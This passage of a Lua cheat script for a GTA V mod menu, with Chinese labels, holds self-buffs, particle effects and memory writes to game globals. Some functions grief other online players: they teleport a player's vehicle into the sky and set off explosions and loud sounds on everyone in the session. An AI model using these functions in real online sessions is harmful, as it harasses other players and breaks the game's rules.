        this_dist = v3.distance(coords, ENTITY.GET_ENTITY_COORDS(veh))
        if this_dist < closest_dist  and ENTITY.GET_ENTITY_HEALTH(veh) > 0 then
            closest = veh
            closest_dist = this_dist
        end
    end
    if closest ~= nil then 
        return {closest, closest_dist}
    else
        return nil 
    end
end
    
function get_closest_ped(coords)
    local closest = nil
    local closest_dist = 1000000
    local this_dist = 0
    for _, ped in pairs(entities.get_all_peds_as_handles()) do 
        this_dist = v3.distance(coords, ENTITY.GET_ENTITY_COORDS(ped))
        if this_dist < closest_dist and not PED.IS_PED_A_PLAYER(ped) and not PED.IS_PED_FATALLY_INJURED(ped)  and not PED.IS_PED_IN_ANY_VEHICLE(ped, true) then
            closest = ped
            closest_dist = this_dist
        end
    end
    if closest ~= nil then 
        return {closest, closest_dist}
    else
        return nil 
    end
end

function get_closest_ped_to_ped(coords, init_ped)
    local coords = ENTITY.GET_ENTITY_COORDS(init_ped)
    local closest = nil
    local closest_dist = 1000000
    local this_dist = 0
    for _, ped in pairs(entities.get_all_peds_as_handles()) do 
        this_dist = v3.distance(coords, ENTITY.GET_ENTITY_COORDS(ped))
        if this_dist < closest_dist and not PED.IS_PED_A_PLAYER(ped) and not PED.IS_PED_FATALLY_INJURED(ped) and not PED.IS_PED_IN_ANY_VEHICLE(ped, true) and ped ~= init_ped then
            closest = ped
            closest_dist = this_dist
        end
    end
    if closest ~= nil then 
        return {closest, closest_dist}
    else
        return nil 
    end
end

function get_friend_count()
    native_invoker.begin_call();native_invoker.end_call("203F1CFD823B27A4");
    return native_invoker.get_return_value_int();
end
function get_frined_name(friendIndex)
    native_invoker.begin_call();native_invoker.push_arg_int(friendIndex);native_invoker.end_call("E11EBBB2A783FE8B");
    return native_invoker.get_return_value_string();
end

function is_friend_online(name)
    native_invoker.begin_call();native_invoker.push_arg_string(name);native_invoker.end_call("425A44533437B64D");
    return native_invoker.get_return_value_bool();
end

function love_online(name)
    native_invoker.begin_call()native_invoker.end_call_2(0x1077788E268557C2);
    return native_invoker.get_return_value_bool();
end

function max_friend_list()
    native_invoker.begin_call();native_invoker.end_call("AFEBB0D5D8F687D2");
    return native_invoker.get_return_value_int();
end

function socialclub_active()
    native_invoker.begin_call()native_invoker.end_call_2(0xC406BE343FC4B9AF)
    return native_invoker.get_return_value_bool()
end

function gen_fren_funcs(name)
	local balls = menu.list(frendlist,name, {"friend "..name}, "", function(); end)
	menu.divider(balls ,name)
	menu.action(balls,"加入战局", {"jf "..name}, "",function()
		menu.trigger_commands("join "..name)
	end)
	menu.action(balls,"观看玩家", {"sf "..name}, "",function()
		menu.trigger_commands("namespectate "..name)
	end)
	menu.action(balls,"邀请到战局", {"if "..name}, "",function()
		menu.trigger_commands("invite "..name)
	end)
	menu.action(balls,"打开玩家档案", {"pf "..name}, "",function()
		menu.trigger_commands("nameprofile "..name)
	end)
    menu.toggle(balls,"特别关心", {"love ".. name}, "", function(on_toggle)
        if on_toggle then
        if is_friend_online(name) then
            util.toast("您的特别关心 " ..name.. " 目前在线")
            notification("您的特别关心 " ..name.. " 目前在线")
        end
    end
    end)
    --[[if SCRIPT_MANUAL_START then
        if is_friend_online(name) then
            notification("欢迎回到GRANDTOURINGVIP!\n您的特别关心 " ..name.. " 目前在线，您要做些什么嘛？")
        if not is_friend_online(name) then
            notification("欢迎回到GRANDTOURINGVIP!\n您的特别关心目前都没有在线")
        end
    end
end]]
end

defaultHealth = ENTITY.GET_ENTITY_MAX_HEALTH(PLAYER.PLAYER_PED_ID())
moddedHealth = defaultHealth

function custom_health(toggle)
    UsingModHealth = toggle
    
    local localPed = PLAYER.PLAYER_PED_ID()
    if UsingModHealth then
        PED.SET_PED_MAX_HEALTH(localPed, moddedHealth)
        ENTITY.SET_ENTITY_HEALTH(localPed, moddedHealth)
    else
        PED.SET_PED_MAX_HEALTH(localPed, defaultHealth)
        menu.trigger_command(moddedHealthSlider, defaultHealth) -- just if you want the slider to go to default value when mod health is off
        if ENTITY.GET_ENTITY_HEALTH(localPed) > defaultHealth then
            ENTITY.SET_ENTITY_HEALTH(localPed, defaultHealth)
        end
    end
end

function setcustomhealth(value)
    moddedHealth = value
end

defaultArmour = PLAYER.GET_PLAYER_MAX_ARMOUR(PLAYER.PLAYER_ID())
moddedArmour = defaultArmour

function custom_armor(toggle)
    UsingModArmour = toggle
    
    if UsingModArmour then
        PLAYER.SET_PLAYER_MAX_ARMOUR(PLAYER.PLAYER_ID(), moddedArmour)
    else
        PLAYER.SET_PLAYER_MAX_ARMOUR(PLAYER.PLAYER_ID(), defaultArmour)
        menu.trigger_command(moddedArmourSlider, defaultArmour) -- just if you want the slider to go to default value when mod Armour is off
    end
end

function setcustomarmor(value)
    moddedArmour = value
end

function healthincover()
    if PED.IS_PED_IN_COVER(players.user_ped(), false) then
		PLAYER._SET_PLAYER_HEALTH_RECHARGE_LIMIT(players.user(), 1.0)
		PLAYER.SET_PLAYER_HEALTH_RECHARGE_MULTIPLIER(players.user(), 15.0)
	else
		PLAYER._SET_PLAYER_HEALTH_RECHARGE_LIMIT(players.user(), 0.5)
		PLAYER.SET_PLAYER_HEALTH_RECHARGE_MULTIPLIER(players.user(), 1.0)
	end
end

local function set_health_refill_limit_and_mult(limit, mult)
    PLAYER._SET_PLAYER_HEALTH_RECHARGE_LIMIT(PLAYER.PLAYER_ID(), limit)
    PLAYER.SET_PLAYER_HEALTH_RECHARGE_MULTIPLIER(PLAYER.PLAYER_ID(), mult)
end

local normal_refill_limit = 0.25
local normal_refill_mult = 1.0
local isCustomRefill_Normal
function standhealthon(toggle)
        isCustomRefill_Normal = toggle
        while isCustomRefill_Normal do
            set_health_refill_limit_and_mult(normal_refill_limit, normal_refill_mult)
            wait(300)
        end
        if not isCustomRefill_Normal then
            set_health_refill_limit_and_mult(0.25, 1.0)
        end
end

function standhpmode(value)
    normal_refill_limit = value * 0.01
end

function standhpmodetime(value)
    normal_refill_mult = value
end

local cover_refill_limit = 0.25
local cover_refill_mult = 1.0
local isCustomRefill_Cover
function hidehealthon(toggle)
    isCustomRefill_Cover = toggle
    
    while isCustomRefill_Cover do
        if PED.IS_PED_IN_COVER(PLAYER.PLAYER_PED_ID()) then
            set_health_refill_limit_and_mult(cover_refill_limit, cover_refill_mult)
        end
        wait(300)
    end

    if not isCustomRefill_Cover then
        set_health_refill_limit_and_mult(0.25, 1.0)
    end
end

function hidehpmode(value)
    cover_refill_limit = value * 0.01
end

function hidehpmodetime(value)
    cover_refill_mult = value
end

Colour = {}

function new.colour(R, G, B, A)
    return {r = R / 255, g = G / 255, b = B / 255, a = A or 1}
end
function new.hudSettings(X, Y, ALIGNMENT)
    return {xOffset = X, yOffset = Y, scale = 0.5, alignment = ALIGNMENT, textColour = new.colour( 255, 255, 255 )}
end
function new.delay(MS, S, MIN)
    return {ms = MS, s = S, min = MIN}
end

function firewingscale(value)
    fireWingsSettings.scale = value / 10
end

function firewingcolour(colour)
    fireWingsSettings.colour = colour
end

local mildOrangeFire = new.colour( 255, 127, 80 )

fireBreathSettings = {
    scale = 0.3,
    colour = mildOrangeFire,
    on = false,
    y = { value = 0.12, still = 0.12, walk =  0.22, sprint = 0.32, sneak = 0.35 },
    z = { value = 0.58, still = 0.58, walk =  0.45, sprint = 0.38, sneak = 0.35 },
}

local fireWings = {
            [1] = {pos = {[1] = 100, [2] =  50}},
            [2] = {pos = {[1] = 100, [2] = -50}},
            [3] = {pos = {[1] = 115, [2] =  50}},
            [4] = {pos = {[1] = 115, [2] = -50}},
            [5] = {pos = {[1] = 160, [2] =  50}},
            [6] = {pos = {[1] = 160, [2] = -50}},
            [7] = {pos = {[1] = 170, [2] =  50}},
            [8] = {pos = {[1] = 170, [2] = -50}},
			[9] = {pos = {[1] = 110, [2] =  50}},
            [10] = {pos = {[1] = 110, [2] = -50}},
			[11] = {pos = {[1] = 120, [2] =  50}},
            [12] = {pos = {[1] = 120, [2] = -50}},
			[13] = {pos = {[1] = 130, [2] =  50}},
            [14] = {pos = {[1] = 130, [2] = -50}},
			[15] = {pos = {[1] = 190, [2] =  50}},
            [16] = {pos = {[1] = 190, [2] = -50}},
			[17] = {pos = {[1] = 175, [2] =  50}},
            [18] = {pos = {[1] = 175, [2] = -50}},
			[19] = {pos = {[1] = 140, [2] =  50}},
            [20] = {pos = {[1] = 140, [2] = -50}},
			[21] = {pos = {[1] = 150, [2] =  50}},
            [22] = {pos = {[1] = 150, [2] = -50}},
			[23] = {pos = {[1] = 180, [2] =  50}},
            [24] = {pos = {[1] = 180, [2] = -50}},
        }

fireWingsSettings = {
    scale = 0.3,
    colour = mildOrangeFire,
    on = false
}
local ptfxEgg
function firewing(toggle)
    fireWingsSettings.on = toggle
    if fireWingsSettings.on then
        ENTITY.SET_ENTITY_PROOFS(players.user_ped(), false, true, false, false, false, false, 1, false)
        if ptfxEgg == nil then
            local eggHash = 1803116220
            loadModel(eggHash)
            ptfxEgg = entities.create_object(eggHash, ENTITY.GET_ENTITY_COORDS(players.user_ped()))
            ENTITY.SET_ENTITY_COLLISION(ptfxEgg, false, false)
            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(eggHash)
        end
        for i = 1, #fireWings do
            while not STREAMING.HAS_NAMED_PTFX_ASSET_LOADED('weap_xs_vehicle_weapons') do
                STREAMING.REQUEST_NAMED_PTFX_ASSET('weap_xs_vehicle_weapons')
                wait()
            end
            GRAPHICS.USE_PARTICLE_FX_ASSET('weap_xs_vehicle_weapons')
            fireWings[i].ptfx = GRAPHICS.START_NETWORKED_PARTICLE_FX_LOOPED_ON_ENTITY('muz_xs_turret_flamethrower_looping', ptfxEgg, 0, 0, 0.1, fireWings[i].pos[1], 0, fireWings[i].pos[2], fireWingsSettings.scale, false, false, false)

            util.create_tick_handler(function()
                local rot = ENTITY.GET_ENTITY_ROTATION(players.user_ped(), 2)
                ENTITY.ATTACH_ENTITY_TO_ENTITY(ptfxEgg, players.user_ped(), -1, 0, 0, 0, rot.x, rot.y, rot.z, false, false, false, false, 0, false)
                ENTITY.SET_ENTITY_ROTATION(ptfxEgg, rot.x, rot.y, rot.z, 2, true)
                for i = 1, #fireWings do
                    GRAPHICS.SET_PARTICLE_FX_LOOPED_SCALE(fireWings[i].ptfx, fireWingsSettings.scale)
                    GRAPHICS.SET_PARTICLE_FX_LOOPED_COLOUR(fireWings[i].ptfx, fireWingsSettings.colour.r, fireWingsSettings.colour.g, fireWingsSettings.colour.b)
                end

                ENTITY.SET_ENTITY_VISIBLE(ptfxEgg, false)
                return fireWingsSettings.on
            end)
        end
    else
        for i = 1, #fireWings do
            if fireWings[i].ptfx then
                GRAPHICS.REMOVE_PARTICLE_FX(fireWings[i].ptfx, true)
                fireWings[i].ptfx = nil
            end
            if ptfxEgg then
                entities.delete_by_handle(ptfxEgg)
                ptfxEgg = nil
            end
        end
        STREAMING.REMOVE_NAMED_PTFX_ASSET('weap_xs_vehicle_weapons')
    end
end

local function transitionValue(value, target, step)
    if value == target then return value end
    return value + step * ( value > target and -1 or 1 )
end

function fireBreathSettings:changePos(movementType)
    self.z.value = transitionValue(self.z.value, self.z[movementType], 0.01)
    self.y.value = transitionValue(self.y.value, self.y[movementType], 0.01)
end

levitationCommand = menu.ref_by_path('Self>Movement>Levitation>Levitation', 38)

function firebreathxxx(toggle)
    fireBreathSettings.on = toggle
    if toggle then
        while not STREAMING.HAS_NAMED_PTFX_ASSET_LOADED('weap_xs_vehicle_weapons') do
            STREAMING.REQUEST_NAMED_PTFX_ASSET('weap_xs_vehicle_weapons')
            wait()
        end
        GRAPHICS.USE_PARTICLE_FX_ASSET('weap_xs_vehicle_weapons')
        fireBreathSettings.ptfx = GRAPHICS.START_NETWORKED_PARTICLE_FX_LOOPED_ON_ENTITY_BONE('muz_xs_turret_flamethrower_looping', players.user_ped(), 0, 0.12, 0.58, 30, 0, 0, 0x8b93, fireBreathSettings.scale, false, false, false)
        GRAPHICS.SET_PARTICLE_FX_LOOPED_COLOUR(fireBreathSettings.ptfx, fireBreathSettings.colour.r, fireBreathSettings.colour.g, fireBreathSettings.colour.b)
    else
        GRAPHICS.REMOVE_PARTICLE_FX(fireBreathSettings.ptfx, true)
        fireBreathSettings.ptfx = nil
        STREAMING.REMOVE_NAMED_PTFX_ASSET('weap_xs_vehicle_weapons')
    end
    util.create_tick_handler(function()
        local user_ped = players.user_ped()
        if PED.GET_PED_PARACHUTE_STATE(user_ped) == 0 and ENTITY.IS_ENTITY_IN_AIR(user_ped) then
            GRAPHICS.SET_PARTICLE_FX_LOOPED_OFFSETS(fireBreathSettings.ptfx, 0, 0.81, 0, -10, 0, 0)
        elseif menu.get_value(levitationCommand) then
            GRAPHICS.SET_PARTICLE_FX_LOOPED_OFFSETS(fireBreathSettings.ptfx, 0, -0.12, 0.58, 150, 0, 0)
        else
            local movementType = 'still'
            if TASK.IS_PED_SPRINTING(user_ped) then
                movementType = 'sprint'
            elseif TASK.IS_PED_WALKING(user_ped) then
                movementType = 'walk'
            elseif PED.GET_PED_STEALTH_MOVEMENT(user_ped) then
                movementType = 'sneak'
            end

            fireBreathSettings:changePos(movementType)
            GRAPHICS.SET_PARTICLE_FX_LOOPED_OFFSETS(fireBreathSettings.ptfx, 0, fireBreathSettings.y.value, fireBreathSettings.z.value, 30, 0, 0)
        end
        return fireBreathSettings.on
    end)
end

function clumsy()
    if PED.IS_PED_RAGDOLL(players.user_ped()) then wait(3000) return end
        PED.SET_PED_RAGDOLL_ON_COLLISION(players.user_ped(), true)
end

function stumble()
    local vector = ENTITY.GET_ENTITY_FORWARD_VECTOR(players.user_ped())
    PED.SET_PED_TO_RAGDOLL_WITH_FALL(players.user_ped(), 1500, 2000, 2, vector.x, -vector.y, vector.z, 1, 0, 0, 0, 0, 0, 0)
end


function ragdoll_self()
    PED.SET_PED_TO_RAGDOLL(players.user_ped(), 2000, 2000, 0, true, true, true)
end

function firebreathscale(value)
    fireBreathSettings.scale = value / 10
    GRAPHICS.SET_PARTICLE_FX_LOOPED_SCALE(fireBreathSettings.ptfx, fireBreathSettings.scale)
end

function firebreathcolour(colour)
    fireBreathSettings.colour = colour
    GRAPHICS.SET_PARTICLE_FX_LOOPED_COLOUR(fireBreathSettings.ptfx, fireBreathSettings.colour.r, fireBreathSettings.colour.g, fireBreathSettings.colour.b)
end
--上帝之指
local is_player_pointing = function ()
	return read_global.int(4521801 + 930) == 3
end

local targetEntity = NULL
local lastStop <const> = newTimer()
local explosionProof = false
function godfinger()
    if is_player_pointing() then
		write_global.int(4521801 + 935, NETWORK.GET_NETWORK_TIME())
		if not ENTITY.DOES_ENTITY_EXIST(targetEntity) then
			local flag = TraceFlag.peds | TraceFlag.vehicles | TraceFlag.pedsSimpleCollision | TraceFlag.objects
			local raycastResult = get_raycast_result(500.0, flag)

			if raycastResult.didHit and ENTITY.DOES_ENTITY_EXIST(raycastResult.hitEntity) then
				targetEntity = raycastResult.hitEntity
			end
		else
			local myPos = players.get_position(players.user())
			local entityPos = ENTITY.GET_ENTITY_COORDS(targetEntity, true)
			local camDir = CAM.GET_GAMEPLAY_CAM_ROT(0):toDir()
			local distance = myPos:distance(entityPos)
			if distance > 30.0 then distance = 30.0
			elseif distance < 10.0 then distance = 10.0 end
			local targetPos = v3.new(camDir)
			targetPos:mul(distance)
			targetPos:add(myPos)
			local direction = v3.new(targetPos)
			direction:sub(entityPos)
			direction:normalise()

			if ENTITY.IS_ENTITY_A_PED(targetEntity) then
				direction:mul(5.0)
				local explosionPos = v3.new(entityPos)
				explosionPos:sub(direction)
				draw_bounding_box(targetEntity, false, {r = 255, g = 255, b = 255, a = 255})
				set_explosion_proof(players.user_ped(), true)
				explosionProof = true
				FIRE.ADD_EXPLOSION(explosionPos.x, explosionPos.y, explosionPos.z, 29, 25.0, false, true, 0.0, true)
			else
				local vel = v3.new(direction)
				local magnitude = entityPos:distance(targetPos)
				vel:mul(magnitude)
				draw_bounding_box(targetEntity, true, {r = 255, g = 255, b = 255, a = 80})
				request_control_once(targetEntity)
				ENTITY.SET_ENTITY_VELOCITY(targetEntity, vel.x, vel.y, vel.z)
			end
		end
	elseif targetEntity ~= NULL then
		lastStop.reset()
		targetEntity = NULL

	elseif explosionProof and lastStop.elapsed() > 500 then
		explosionProof = false
		set_explosion_proof(players.user_ped(), false)
    end
end
--轨迹
function removeFxs(effects)
	for _, effect in ipairs(effects) do
		GRAPHICS.STOP_PARTICLE_FX_LOOPED(effect, 0)
		GRAPHICS.REMOVE_PARTICLE_FX(effect, 0)
	end
end

local function getZoneName(pid)
    return util.get_label_text(ZONE.GET_NAME_OF_ZONE(v3.get(players.get_position(pid))))
end

local wasDead = false
local respawnPos
local respawnRot
function custom_respawn()
    if respawnPos == nil then return end
    local isDead = PLAYER.IS_PLAYER_DEAD(players.user())
    if wasDead and not isDead then
        while PLAYER.IS_PLAYER_DEAD(players.user()) do
            wait()
        end
        for i = 0, 30 do
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(players.user_ped(), respawnPos.x, respawnPos.y, respawnPos.z, false, false, false)
            ENTITY.SET_ENTITY_ROTATION(players.user_ped(), respawnRot.x, respawnRot.y, respawnRot.z, 2, true)
            wait()
        end
    end
    wasDead = isDead
end

function save_custom_respawn()
    respawnPos = players.get_position(players.user())
    respawnRot = ENTITY.GET_ENTITY_ROTATION(players.user_ped(), 2)
    menu.set_menu_name(custom_respawn_toggle, '自定义复活' ..': '.. getZoneName(players.user()))
    local pos = 'X: '.. respawnPos.x ..'\nY: '.. respawnPos.y ..'\nZ: '.. respawnPos.z
    menu.set_help_text(custom_respawn_toggle,  pos)
    menu.set_help_text(custom_respawn_location,  '当前位置' ..':\n'.. pos)
end




function getOffsetFromCam(dist)
    local pos = CAM.GET_FINAL_RENDERED_CAM_COORD()
    local dir = v3.toDir(CAM.GET_FINAL_RENDERED_CAM_ROT(2))
    local offset = {
        x = pos.x + dir.x * dist,
        y = pos.y + dir.y * dist,
        z = pos.z + dir.z * dist
    }
    return offset
end

local function request_ptfx_asset_lasereyes(asset)
    local request_time = os.time()
    STREAMING.REQUEST_NAMED_PTFX_ASSET(asset)
    while not STREAMING.HAS_NAMED_PTFX_ASSET_LOADED(asset) do
        if os.time() - request_time >= 10 then
            break
        end
        wait()
    end
end

function laser_eyes()
    local weaponHash = util.joaat("weapon_heavysniper_mk2")
    local dictionary = "weap_xs_weapons"
    local ptfx_name = "bullet_tracer_xs_sr"
    local camRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2)
    if PAD.IS_CONTROL_PRESSED(51, 51) then
        -- credits to jinxscript
        local inst = v3.new()
        v3.set(inst,CAM.GET_FINAL_RENDERED_CAM_ROT(2))
        local tmp = v3.toDir(inst)
        v3.set(inst, v3.get(tmp))
        v3.mul(inst, 1000)
        v3.set(tmp, CAM.GET_FINAL_RENDERED_CAM_COORD())
        v3.add(inst, tmp)
        camAim_x, camAim_y, camAim_z = v3.get(inst)
        local ped_model = ENTITY.GET_ENTITY_MODEL(players.user_ped())
        local left_eye_id = 0
        local right_eye_id = 0
        pluto_switch ped_model do 
            case 1885233650:
            case -1667301416:
                left_eye_id = 25260
                right_eye_id = 27474
                break
            -- michael / story mode character
            case 225514697:
            -- imply they're using a story mode ped i guess. i dont know what else to do unless i have data on every single ped
            default:
                left_eye_id = 5956
                right_eye_id = 6468
        end
        local boneCoord_L = ENTITY.GET_WORLD_POSITION_OF_ENTITY_BONE(players.user_ped(), PED.GET_PED_BONE_INDEX(players.user_ped(), left_eye_id))
        local boneCoord_R = ENTITY.GET_WORLD_POSITION_OF_ENTITY_BONE(players.user_ped(), PED.GET_PED_BONE_INDEX(players.user_ped(), right_eye_id))
        if ped_model == util.joaat("mp_f_freemode_01") then 
            boneCoord_L.z += 0.02
            boneCoord_R.z += 0.02
        end
        camRot.x += 90
        request_ptfx_asset_lasereyes(dictionary)
        GRAPHICS.USE_PARTICLE_FX_ASSET(dictionary)
        GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(ptfx_name, boneCoord_L.x, boneCoord_L.y, boneCoord_L.z, camRot.x, camRot.y, camRot.z, 2, 0, 0, 0, false)
        GRAPHICS.USE_PARTICLE_FX_ASSET(dictionary)
        GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(ptfx_name, boneCoord_R.x, boneCoord_R.y, boneCoord_R.z, camRot.x, camRot.y, camRot.z, 2, 0, 0, 0, false)
        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS_IGNORE_ENTITY(boneCoord_L.x, boneCoord_L.y, boneCoord_L.z, camAim_x, camAim_y, camAim_z, 100, true, weaponHash, players.user_ped(), false, true, 100, players.user_ped(), 0)
        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS_IGNORE_ENTITY(boneCoord_R.x, boneCoord_R.y, boneCoord_R.z, camAim_x, camAim_y, camAim_z, 100, true, weaponHash, players.user_ped(), false, true, 100, players.user_ped(), 0)
    end
end

maxHealth_cantseeyouinmap = 328
function undead()
    if  ENTITY.GET_ENTITY_MAX_HEALTH(players.user_ped()) ~= 0 then
		ENTITY.SET_ENTITY_MAX_HEALTH(players.user_ped(), 0)
	end
end

function autoaccept()
    local message_hash = Jinx.GET_WARNING_SCREEN_MESSAGE_HASH()
    if message_hash == 15890625 or message_hash == -398982408 or message_hash == -587688989 then
        PAD.SET_CONTROL_VALUE_NEXT_FRAME(2, 201, 1.0)
        wait(50)
    end
end

local function bitTest(addr, offset)
    return (memory.read_int(addr) & (1 << offset)) ~= 0
end

local function clearBit(addr, bitIndex)
    memory.write_int(addr, memory.read_int(addr) & ~(1<<bitIndex))
end

function attach_to_player(hash, bone, x, y, z, xrot, yrot, zrot)           --attach object to player ped
    local user_ped = PLAYER.PLAYER_PED_ID()
    hash = util.joaat(hash)

    STREAMING.REQUEST_MODEL(hash)
    while not STREAMING.HAS_MODEL_LOADED(hash) do		
        wait()
    end
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(hash)

    local object = OBJECT.CREATE_OBJECT(hash, 0.0,0.0,0, true, true, false)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(object, user_ped, PED.GET_PED_BONE_INDEX(PLAYER.PLAYER_PED_ID(), bone), x, y, z, xrot, yrot, zrot, false, false, false, false, 2, true) 
end
--删除物体
function delete_object(model)
    local hash = util.joaat(model)
    for k, object in pairs(entities.get_all_objects_as_handles()) do
        if ENTITY.GET_ENTITY_MODEL(object) == hash then
            ENTITY.SET_ENTITY_AS_MISSION_ENTITY(object, false, false) 
            entities.delete_by_handle(object)
        end
    end
end
--重新模型
function request_model(model)
	if STREAMING.IS_MODEL_VALID(model) and not STREAMING.HAS_MODEL_LOADED(model) then
		STREAMING.REQUEST_MODEL(model)
		while not STREAMING.HAS_MODEL_LOADED(model) do
			wait()
		end
	end
end
--生成载具
    function set_vehicle_any_parachute(veh,vehiclehash,parachutehash)
        request_model(vehiclehash,300)
        request_model(parachutehash,300)
        VEHICLE.SET_VEHICLE_MODEL_IS_SUPPRESSED(vehiclehash,true)  
        VEHICLE._SET_VEHICLE_PARACHUTE_MODEL(veh,parachutehash)
    end
--将玩家传送到花园银行
function sqhy(pid)
         local ped = PLAYER.GET_PLAYER_PED(pid)
        local pc = ENTITY.GET_ENTITY_COORDS(ped)
        local oldcoords = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED())
        for o = 0, 10 do
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PLAYER.GET_PLAYER_PED(), pc.x, pc.y, pc.z + 10, false, false, false)
            wait(50)
        end
        if PED.IS_PED_IN_ANY_VEHICLE(ped, false) then
            local veh = PED.GET_VEHICLE_PED_IS_IN(ped, false) 
            for a = 0, 10 do
                NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(veh, -76, -819, 327, false, false, false)
                wait(100)
            end
            if SE_Notifications then
                notification("传送 " .. NETWORK.NETWORK_PLAYER_GET_NAME(pid) .. " 上去花园银行塔!")
            end
        else
            notification("玩家 " .. NETWORK.NETWORK_PLAYER_GET_NAME(pid) .. " 不在车内!")
        end
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PLAYER.PLAYER_PED_ID(), oldcoords.x, oldcoords.y, oldcoords.z, false, false, false)
end
--将玩家传送到高空
function sqgk(pid)
        local ped = PLAYER.GET_PLAYER_PED(pid)
        local pc = ENTITY.GET_ENTITY_COORDS(ped)
        local oldcoords = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID())
        for o = 0, 10 do
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PLAYER.PLAYER_PED_ID(), pc.x, pc.y, pc.z + 10, false, false, false)
            wait(50)
        end
        if PED.IS_PED_IN_ANY_VEHICLE(ped, false) then
            local veh = PED.GET_VEHICLE_PED_IS_IN(ped, false) 
            for a = 0, 10 do
                NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(veh, -75, -818, 2400, false, false, false)
                wait(100)
            end
            if SE_Notifications then
                notification("传送 " .. NETWORK.NETWORK_PLAYER_GET_NAME(pid) .. " 上去高空!")
            end
        else
            notification("玩家 " .. NETWORK.NETWORK_PLAYER_GET_NAME(pid) .. " 不在车内!")
        end
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PLAYER.PLAYER_PED_ID(), oldcoords.x, oldcoords.y, oldcoords.z, false, false, false)
end

--hedan
GTYYDS = {
int = function(global, value)
local radress = memory.script_global(global)
memory.write_int(radress, value)
end,
GTYYDS1 = function(sound, sound_group, wait_for)
for i=0, 31, 1 do
AUDIO.PLAY_SOUND_FROM_ENTITY(-1, sound, PLAYER.GET_PLAYER_PED(i), sound_group, true, 20)
end
wait(wait_for)
end,
get_coords = function(entity)
entity = entity or PLAYER.PLAYER_PED_ID()
return ENTITY.GET_ENTITY_COORDS(entity, true)
end,
GTYYDS2 = function(earrape_type, wait_for)
for i=0, 31, 1 do
coords = GTYYDS.get_coords(PLAYER.GET_PLAYER_PED(i))
FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 0, 100, true, false, 150, false)
if earrape_type == EARRAPE_BED then
AUDIO.PLAY_SOUND_FROM_COORD(-1, "Bed", coords.x, coords.y, coords.z, "WastedSounds", true, 999999999, true)
end
if earrape_type == EARRAPE_FLASH then
AUDIO.PLAY_SOUND_FROM_COORD(-1, "MP_Flash", coords.x, coords.y, coords.z, "WastedSounds", true, 999999999, true)
AUDIO.PLAY_SOUND_FROM_COORD(-1, "MP_Flash", coords.x, coords.y, coords.z, "WastedSounds", true, 999999999, true)
AUDIO.PLAY_SOUND_FROM_COORD(-1, "MP_Flash", coords.x, coords.y, coords.z, "WastedSounds", true, 999999999, true)
end
end
wait(wait_for)
end
}

function snowpeople(on)
    local zhangzi = "prop_gumball_03"
    local sonwman = "prop_prlg_snowpile"
    if on then
        attach_to_player(sonwman, 0, 0.0, 0, 0, 0, 0,0)
        attach_to_player(sonwman, 0, 0.0, 0, -0.5, 0, 0,0)
        attach_to_player(sonwman, 0, 0.0, 0, -1, 0, 0,0)
        attach_to_player(zhangzi, 0, 0.0, 0, 0, 0, 50,0)
        attach_to_player(zhangzi, 0, 0.0, 0, 0, 0, 125,0)
        attach_to_player(zhangzi, 0, 0.0, 0, 0, 0, -50,0)
        attach_to_player(zhangzi, 0, 0.0, 0, 0, 0, -125,0)
    else
        delete_object(sonwman)
        delete_object(zhangzi)
    end
end

function ikunjix3(on)
    local zhangzi = "v_ind_chickensx3"
    local sonwman = "v_ind_chickensx3"
    if on then
        attach_to_player(sonwman, 0, 0.0, 0, 0, 0, 0,0)
        attach_to_player(sonwman, 0, 0.0, 0, -0.5, 0, 0,0)
        attach_to_player(sonwman, 0, 0.0, 0, -1, 0, 0,0)
        attach_to_player(zhangzi, 0, 0.0, 0, 0, 0, 50,0)
        attach_to_player(zhangzi, 0, 0.0, 0, 0, 0, 125,0)
        attach_to_player(zhangzi, 0, 0.0, 0, 0, 0, -50,0)
        attach_to_player(zhangzi, 0, 0.0, 0, 0, 0, -125,0)
    else
        delete_object(sonwman)
        delete_object(zhangzi)
    end
end

function huoqujia(on)
    local zhangzi = "imp_prop_bomb_ball"
    local sonwman = "imp_prop_bomb_ball"
    if on then
        attach_to_player(sonwman, 0, 0.0, 0, -0.5, 0, 0,0)
        attach_to_player(sonwman, 0, 0.0, 0, -0.3, 0, 0,0)
        attach_to_player(sonwman, 0, 0.0, 0, 0.1, 0, 0,0)
        attach_to_player(zhangzi, 0, 0.0, 0, 0.3, 0, 50,0)
        attach_to_player(zhangzi, 0, 0.0, 0, 0.5, 0, 125,0)
        attach_to_player(zhangzi, 0, 0.0, 0, 0.7, 0, -50,0)
        attach_to_player(zhangzi, 0, 0.0, 0, -0.7, 0, -125,0)
    else
        delete_object(sonwman)
        delete_object(zhangzi)
    end
end

local ped_flags = {}
function firepersonl(on)
    ped_flags[430] = on
    if on then
        menu.trigger_commands("godmode off")
        FIRE.START_ENTITY_FIRE(PLAYER.PLAYER_PED_ID())
        ENTITY.SET_ENTITY_PROOFS(players.user_ped(), false, true, false, false, false, false, 0, false)
        menu.trigger_commands("demigodmode on")
    else
        FIRE.STOP_ENTITY_FIRE(PLAYER.PLAYER_PED_ID())
        ENTITY.SET_ENTITY_PROOFS(players.user_ped(), false, false, false, false, false, false, 0, false)
        menu.trigger_commands("godmode on")
    end
end

function get_entities_in_player_range(pId, radius)
	local peds = get_peds_in_player_range(pId, radius)
	local vehicles = get_vehicles_in_player_range(pId, radius)
	local entities = peds
	for i = 1, #vehicles do table.insert(entities, vehicles[i]) end
	return entities
end

